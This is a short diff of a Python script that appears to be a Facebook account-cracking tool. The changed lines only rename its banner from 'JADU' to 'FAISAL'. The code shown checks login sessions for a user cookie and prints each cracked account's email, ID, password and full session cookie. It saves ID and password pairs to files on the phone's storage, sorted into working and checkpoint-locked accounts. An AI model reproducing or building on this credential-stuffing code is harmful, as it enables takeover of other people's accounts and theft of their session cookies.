@@ -230,7 +230,7 @@ def free(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\033[1;32m[√]---------------------[JADU-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
+                print('\r\033[1;32m[√]---------------------[FAISAL-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                 cek_apk(session,coki)
                 open('/sdcard/Jadugar-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -239,7 +239,7 @@ def free(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid=coki[24:39]
                 Red = '\033[1;31m'
-                print(f'\r{Red}[×]--------------------[JADU-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
+                print(f'\r{Red}[×]--------------------[FAISAL-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                 open('/sdcard/Jadugar-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
